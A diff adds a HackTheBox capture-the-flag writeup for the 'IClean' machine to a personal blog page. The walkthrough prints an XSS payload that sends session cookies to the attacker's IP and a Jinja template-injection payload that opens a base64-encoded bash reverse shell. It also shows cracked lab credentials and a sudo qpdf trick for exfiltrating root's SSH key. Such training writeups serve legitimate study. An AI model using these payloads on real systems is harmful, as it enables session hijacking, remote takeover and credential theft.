@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="light"
-  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  data-auto-appearance="true"><head>
   <meta charset="utf-8" />
   
   <meta http-equiv="content-language" content="en" />
@@ -11,11 +11,11 @@
   <title>HackTheBox: IClean Writeup &middot; Husenjan</title>
   <meta name="title" content="HackTheBox: IClean Writeup &middot; Husenjan" />
   
-  <meta name="description" content="A HackTheBox writeup for the machine IClean." />
+  <meta name="description" content="The IClean machine is about exploiting XSS, Server Side Template Injection, and QPDF." />
   <meta name="keywords" content="HTB, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/htb/iclean/" />
+  <link rel="canonical" href="https://husenjan.com/htb/iclean/" />
   
   
   
@@ -28,8 +28,8 @@
   
   
   
-  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.d3395e2e2ef7b0fe66f2609bdc8c7819c4bf23464022b8da66f5e54ba868bf63aea5481dd20537dcb948cac11a56e7cb6fd2e3e2208b3799ea6672ec37cea0f4.css"
-    integrity="sha512-0zleLi73sP5m8mCb3Ix4GcS/I0ZAIrjaZvXlS6hov2OupUgd0gU33LlIysEaVufLb9Lj4iCLN5nqZnLsN86g9A==" />
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.f7b9ffa3c1d18c29d13d3799844c938fa3080923cf3dd062b930138c6d844b03b4cfb2e53783c23e65aec50bfe797aec89380cb5322336b740997ea2584118d7.css"
+    integrity="sha512-97n/o8HRjCnRPTeZhEyTj6MICSPPPdBiuTATjG2ESwO0z7LlN4PCPmWuxQv&#43;eXrsiTgMtTIjNrdAmX6iWEEY1w==" />
   
   
   <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
@@ -62,21 +62,23 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/htb/iclean/">
+  <meta property="og:url" content="https://husenjan.com/htb/iclean/">
   <meta property="og:site_name" content="Husenjan">
   <meta property="og:title" content="HackTheBox: IClean Writeup">
-  <meta property="og:description" content="A HackTheBox writeup for the machine IClean.">
+  <meta property="og:description" content="The IClean machine is about exploiting XSS, Server Side Template Injection, and QPDF.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="htb">
     <meta property="article:published_time" content="2023-11-25T00:00:00+00:00">
     <meta property="article:modified_time" content="2023-11-25T00:00:00+00:00">
     <meta property="article:tag" content="HTB">
+    <meta property="og:image" content="https://husenjan.com/htb/iclean/featured.png">
 
   
-  <meta name="twitter:card" content="summary">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://husenjan.com/htb/iclean/featured.png">
   <meta name="twitter:title" content="HackTheBox: IClean Writeup">
-  <meta name="twitter:description" content="A HackTheBox writeup for the machine IClean.">
+  <meta name="twitter:description" content="The IClean machine is about exploiting XSS, Server Side Template Injection, and QPDF.">
 
   
   <script type="application/ld+json">
@@ -86,10 +88,10 @@
     "articleSection": "Htbs",
     "name": "HackTheBox: IClean Writeup",
     "headline": "HackTheBox: IClean Writeup",
-    "description": "A HackTheBox writeup for the machine IClean.",
-    "abstract": "A HackTheBox writeup for the machine IClean.",
+    "description": "The IClean machine is about exploiting XSS, Server Side Template Injection, and QPDF.",
+    "abstract": "The IClean machine is about exploiting XSS, Server Side Template Injection, and QPDF.",
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/htb\/iclean\/",
+    "url" : "https:\/\/husenjan.com\/htb\/iclean\/",
     "author" : {
       "@type": "Person",
       "name": "Husenjan"
@@ -103,7 +105,7 @@
     "keywords": ["HTB"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "0"
+    "wordCount": "486"
   }]
   </script>
 
@@ -194,6 +196,16 @@
     
     <p class="text-base font-medium" title="">
         Docs
+    </p>
+</a>
+
+
+            
+            
+  <a href="/htb"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        HTB
     </p>
 </a>
 
@@ -372,6 +384,20 @@
 
                     
   <li class="mt-1">
+    <a href="/htb"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            HTB
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
     <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
         
         <p class="text-bg font-bg" title="">
@@ -433,7 +459,11 @@
 
 
 
+  
 
+
+
+  
 
 
 
@@ -450,7 +480,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2023-11-25 00:00:00 &#43;0000 UTC">25 November 2023</time>
+  <time datetime="2023-11-25 00:00:00 &#43;0000 UTC">25 November 2023</time><span class="px-2 text-primary-500">&middot;</span><span>486 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
   
 
   
@@ -598,6 +628,546 @@
 
         <div class="article-content max-w-prose mb-20">
           
+
+<h2 class="relative group">Nmap 
+    <div id="nmap" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#nmap" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Enumerating the target using Nmap.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -sC -min-rate <span class="m">10000</span> 10.129.223.179 -o nmap.result
+</span></span></code></pre></div><p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/nmap_result_hu9e0bea5d64c1dc40ff200fcafd5e44d7_95881_330x0_resize_box_3.png 330w,
+        /htb/iclean/nmap_result_hu9e0bea5d64c1dc40ff200fcafd5e44d7_95881_660x0_resize_box_3.png 660w,
+        /htb/iclean/nmap_result_hu9e0bea5d64c1dc40ff200fcafd5e44d7_95881_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/nmap_result_hu9e0bea5d64c1dc40ff200fcafd5e44d7_95881_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/nmap_result_hu9e0bea5d64c1dc40ff200fcafd5e44d7_95881_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>Agressively scanning all ports uing Nmap.</figcaption>
+    </figure>
+  
+
+</p>
+<p>When visiting the our target on port 80 we are redirected to <code>capiclean.htb</code>. We can add <code>capiclean.htb</code> to <code>/etc/hosts</code> file to access the website.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/adding_etc_hosts_hud9d33022fcee78e3fe7dfafa60813b4f_54648_330x0_resize_box_3.png 330w,
+        /htb/iclean/adding_etc_hosts_hud9d33022fcee78e3fe7dfafa60813b4f_54648_660x0_resize_box_3.png 660w,
+        /htb/iclean/adding_etc_hosts_hud9d33022fcee78e3fe7dfafa60813b4f_54648_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/adding_etc_hosts_hud9d33022fcee78e3fe7dfafa60813b4f_54648_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/adding_etc_hosts_hud9d33022fcee78e3fe7dfafa60813b4f_54648_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>Adding <code>10.129.223.179 capiclean.htb</code> to /etc/hosts.</figcaption>
+    </figure>
+  
+
+</p>
+
+
+<h2 class="relative group">Initial Foothold 
+    <div id="initial-foothold" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#initial-foothold" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>The <code>http://capiclean.htb/qoute</code> page is interesting as it&rsquo;s sending our request to an user.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/initial_foothold_1_hufbadbd3c26c0a63749035ef3d8052dbb_255405_330x0_resize_box_3.png 330w,
+        /htb/iclean/initial_foothold_1_hufbadbd3c26c0a63749035ef3d8052dbb_255405_660x0_resize_box_3.png 660w,
+        /htb/iclean/initial_foothold_1_hufbadbd3c26c0a63749035ef3d8052dbb_255405_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/initial_foothold_1_hufbadbd3c26c0a63749035ef3d8052dbb_255405_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/initial_foothold_1_hufbadbd3c26c0a63749035ef3d8052dbb_255405_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>The <code>service</code> parameter o <code>http://capiclean.htb/quote</code> is vulnerable for XSS and that enables us to steal cookies of the user that is logged on. We can use the following HTML code to steal the cookie.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;fetch(&#39;http://10.10.16.15:80/?cookie=&#39;+document.cookie);&#34;</span><span class="p">/&gt;</span>
+</span></span></code></pre></div><p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/initial_foothold_2_hudd35f59dfb56ff1ad8dfcbff59a1dc5a_204427_330x0_resize_box_3.png 330w,
+        /htb/iclean/initial_foothold_2_hudd35f59dfb56ff1ad8dfcbff59a1dc5a_204427_660x0_resize_box_3.png 660w,
+        /htb/iclean/initial_foothold_2_hudd35f59dfb56ff1ad8dfcbff59a1dc5a_204427_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/initial_foothold_2_hudd35f59dfb56ff1ad8dfcbff59a1dc5a_204427_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/initial_foothold_2_hudd35f59dfb56ff1ad8dfcbff59a1dc5a_204427_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>Using Burp Suite to modify the <code>server</code> parameter.</figcaption>
+    </figure>
+  
+
+</p>
+<p>The HTML code above will fail to display an image so the code <code>fetch('http://10.10.16.15:80/?cookie=' + document.cookie)</code> is called and that will send the cookies to our python server.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/initial_foothold_3_hu0c7f7ddf90fe1e33ea28f9f6dff317d5_45710_330x0_resize_box_3.png 330w,
+        /htb/iclean/initial_foothold_3_hu0c7f7ddf90fe1e33ea28f9f6dff317d5_45710_660x0_resize_box_3.png 660w,
+        /htb/iclean/initial_foothold_3_hu0c7f7ddf90fe1e33ea28f9f6dff317d5_45710_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/initial_foothold_3_hu0c7f7ddf90fe1e33ea28f9f6dff317d5_45710_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/initial_foothold_3_hu0c7f7ddf90fe1e33ea28f9f6dff317d5_45710_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>The plugin <strong>Cookie Editor</strong> enables us to access the <code>http://capiclean.htb/dashboard</code> with the stolen session cookie.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/initial_foothold_4_huaaea609b3df122f5ac86665e7b22c724_283858_330x0_resize_box_3.png 330w,
+        /htb/iclean/initial_foothold_4_huaaea609b3df122f5ac86665e7b22c724_283858_660x0_resize_box_3.png 660w,
+        /htb/iclean/initial_foothold_4_huaaea609b3df122f5ac86665e7b22c724_283858_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/initial_foothold_4_huaaea609b3df122f5ac86665e7b22c724_283858_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/initial_foothold_4_huaaea609b3df122f5ac86665e7b22c724_283858_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>Using Cookie Editor plugin to change our session cookie to access <code>/dashboard</code>.</figcaption>
+    </figure>
+  
+
+</p>
+<p>To obtain a Remote Code Execution on the server an invoice has to be generated using <strong>Generate Invoice</strong>.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/initial_foothold_5_hue120263e24d7235b1010b0d139d0cd4f_260597_330x0_resize_box_3.png 330w,
+        /htb/iclean/initial_foothold_5_hue120263e24d7235b1010b0d139d0cd4f_260597_660x0_resize_box_3.png 660w,
+        /htb/iclean/initial_foothold_5_hue120263e24d7235b1010b0d139d0cd4f_260597_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/initial_foothold_5_hue120263e24d7235b1010b0d139d0cd4f_260597_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/initial_foothold_5_hue120263e24d7235b1010b0d139d0cd4f_260597_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>Once an invoice has been generated we can use the <strong>Generate QR</strong> and change the parameter that holds <code>{{4*4}}</code> since it&rsquo;s vulnerable for Server Side Template Injection (SSTI).</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/initial_foothold_6_hu75f1f757a15fdc6161192c1a33ad1fd8_272072_330x0_resize_box_3.png 330w,
+        /htb/iclean/initial_foothold_6_hu75f1f757a15fdc6161192c1a33ad1fd8_272072_660x0_resize_box_3.png 660w,
+        /htb/iclean/initial_foothold_6_hu75f1f757a15fdc6161192c1a33ad1fd8_272072_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/initial_foothold_6_hu75f1f757a15fdc6161192c1a33ad1fd8_272072_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/initial_foothold_6_hu75f1f757a15fdc6161192c1a33ad1fd8_272072_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>The <code>qr_link</code> parameter is vulnerable for SSTI.</figcaption>
+    </figure>
+  
+
+</p>
+<p>The website uses the framework Jinja and we can obtain a reverse shell by repalcing the <code>{{4*4}}</code> with the following payload. You will need to change the base64 encoded command to your netcat listener details.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;application&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">getitem</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">builtins</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">getitem</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">import</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;popen&#39;</span><span class="p">)(</span><span class="s1">&#39;echo &#34;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE1LzQ0NDQgMD4mMQ==&#34; | base64 -d | bash&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)()}}</span>
+</span></span></code></pre></div><p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/initial_foothold_7_hu0c28cece601542d11c0ca03c3139ce60_122999_330x0_resize_box_3.png 330w,
+        /htb/iclean/initial_foothold_7_hu0c28cece601542d11c0ca03c3139ce60_122999_660x0_resize_box_3.png 660w,
+        /htb/iclean/initial_foothold_7_hu0c28cece601542d11c0ca03c3139ce60_122999_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/initial_foothold_7_hu0c28cece601542d11c0ca03c3139ce60_122999_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/initial_foothold_7_hu0c28cece601542d11c0ca03c3139ce60_122999_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>The reverse shell is encoded using base64 and it&rsquo;s decoded and executed one the target receives our command and that allows us to obtain a reverse shell into the machine as <code>www-data</code>.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/initial_foothold_8_hu0efbaea5d033139c0d7cd09d63a61672_76146_330x0_resize_box_3.png 330w,
+        /htb/iclean/initial_foothold_8_hu0efbaea5d033139c0d7cd09d63a61672_76146_660x0_resize_box_3.png 660w,
+        /htb/iclean/initial_foothold_8_hu0efbaea5d033139c0d7cd09d63a61672_76146_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/initial_foothold_8_hu0efbaea5d033139c0d7cd09d63a61672_76146_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/initial_foothold_8_hu0efbaea5d033139c0d7cd09d63a61672_76146_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>Obtained a shell as <code>www-data</code>.</figcaption>
+    </figure>
+  
+
+</p>
+
+
+<h2 class="relative group">Lateral Movement 
+    <div id="lateral-movement" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#lateral-movement" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>The <code>app.py</code> file in <code>/opt/app</code> contains a username and password for MySQL server.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/lateral_movement_1_hu605835912e90781a179b3c4a9b3b17d1_123877_330x0_resize_box_3.png 330w,
+        /htb/iclean/lateral_movement_1_hu605835912e90781a179b3c4a9b3b17d1_123877_660x0_resize_box_3.png 660w,
+        /htb/iclean/lateral_movement_1_hu605835912e90781a179b3c4a9b3b17d1_123877_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/lateral_movement_1_hu605835912e90781a179b3c4a9b3b17d1_123877_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/lateral_movement_1_hu605835912e90781a179b3c4a9b3b17d1_123877_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>We can use the credential <code>iclean:pxCsmnGLckUb</code> to login to MySQL Server and obtain the password hash for the user <code>consuela</code> and use Hashcat to crack the password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">1400</span> -a <span class="m">0</span> <span class="s1">&#39;0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa&#39;</span> /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/lateral_movement_2_hu1c83774f480f235b18139f98c84a4c31_190833_330x0_resize_box_3.png 330w,
+        /htb/iclean/lateral_movement_2_hu1c83774f480f235b18139f98c84a4c31_190833_660x0_resize_box_3.png 660w,
+        /htb/iclean/lateral_movement_2_hu1c83774f480f235b18139f98c84a4c31_190833_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/lateral_movement_2_hu1c83774f480f235b18139f98c84a4c31_190833_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/lateral_movement_2_hu1c83774f480f235b18139f98c84a4c31_190833_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>Obtained the credential for <code>consuela</code>.</figcaption>
+    </figure>
+  
+
+</p>
+<p>The password for consuela is <code>simple and clean</code> we can use that password to login as consuela on the server.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/lateral_movement_3_hud064a9a61894f918a1337dbf738ae898_58443_330x0_resize_box_3.png 330w,
+        /htb/iclean/lateral_movement_3_hud064a9a61894f918a1337dbf738ae898_58443_660x0_resize_box_3.png 660w,
+        /htb/iclean/lateral_movement_3_hud064a9a61894f918a1337dbf738ae898_58443_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/lateral_movement_3_hud064a9a61894f918a1337dbf738ae898_58443_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/lateral_movement_3_hud064a9a61894f918a1337dbf738ae898_58443_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>We can add our <code>id_rsa.pub</code> key into <code>/home/consuela/.ssh/authorized_keys</code> to login as consuela using SSH.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/lateral_movement_4_hu32aef0fa92a19d92b6f0ceea07a61969_112833_330x0_resize_box_3.png 330w,
+        /htb/iclean/lateral_movement_4_hu32aef0fa92a19d92b6f0ceea07a61969_112833_660x0_resize_box_3.png 660w,
+        /htb/iclean/lateral_movement_4_hu32aef0fa92a19d92b6f0ceea07a61969_112833_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/lateral_movement_4_hu32aef0fa92a19d92b6f0ceea07a61969_112833_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/lateral_movement_4_hu32aef0fa92a19d92b6f0ceea07a61969_112833_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>Adding <code>id_rsa.pub</code> to <code>/home/consuela/.ssh/authorized_keys</code>.</figcaption>
+    </figure>
+  
+
+</p>
+<p>Now we can login as consuela using SSH.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/lateral_movement_5_hub523357b1328382b7eb7d02f9fa666d8_87868_330x0_resize_box_3.png 330w,
+        /htb/iclean/lateral_movement_5_hub523357b1328382b7eb7d02f9fa666d8_87868_660x0_resize_box_3.png 660w,
+        /htb/iclean/lateral_movement_5_hub523357b1328382b7eb7d02f9fa666d8_87868_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/lateral_movement_5_hub523357b1328382b7eb7d02f9fa666d8_87868_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/lateral_movement_5_hub523357b1328382b7eb7d02f9fa666d8_87868_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>Our <code>id_rsa</code> file can now be used to login as <code>consuela</code>.</figcaption>
+    </figure>
+  
+
+</p>
+
+
+<h2 class="relative group">Road To Root 
+    <div id="road-to-root" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#road-to-root" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Consuela can run <code>/usr/bin/qpdf</code> as <code>sudo</code> and that can be exploited by attaching <code>/root/.ssh/id_rsa</code> as an attachment to an PDF file and the extracting the <code>id_rsa</code> file from the PDF file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Attaching `/root/.ssh/id_rsa`</span>
+</span></span><span class="line"><span class="cl">sudo /usr/bin/qpdf /usr/share/doc/shared-mime-info/shared-mime-info-spec.pdf --add-attachment /root/.ssh/id_rsa -- out.pdf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Checking if `/root/.ssh/id_rsa` has been attached</span>
+</span></span><span class="line"><span class="cl">sudo /usr/bin/qpdf --list-attachments out.pdf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Extracting `id_rsa` from the PDF file</span>
+</span></span><span class="line"><span class="cl">sudo /usr/bin/qpdf --show-attachment<span class="o">=</span>id_rsa out.pdf &gt; id_rsa
+</span></span></code></pre></div><p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /htb/iclean/road_to_root_1_huf8f208ebbb161d7799dcff58d662615f_192408_330x0_resize_box_3.png 330w,
+        /htb/iclean/road_to_root_1_huf8f208ebbb161d7799dcff58d662615f_192408_660x0_resize_box_3.png 660w,
+        /htb/iclean/road_to_root_1_huf8f208ebbb161d7799dcff58d662615f_192408_1024x0_resize_box_3.png 1024w,
+        /htb/iclean/road_to_root_1_huf8f208ebbb161d7799dcff58d662615f_192408_1320x0_resize_box_3.png 2x"
+        src="/htb/iclean/road_to_root_1_huf8f208ebbb161d7799dcff58d662615f_192408_660x0_resize_box_3.png"
+        alt="Alt text"
+      />
+      
+      <figcaption>Successfully obtained a reverse shell as <code>root</code>.</figcaption>
+    </figure>
+  
+
+</p>
+
         </div>
         
         
@@ -633,7 +1203,13 @@
   </footer>
 </article>
 
-      
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
     </main><footer id="site-footer" class="py-10 print:hidden">
   
   
@@ -693,7 +1269,7 @@
 </footer><div
   id="search-wrapper"
   class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
-  data-url="http://localhost:1313/"
+  data-url="https://husenjan.com/"
   style="z-index:500"
 >
   <div
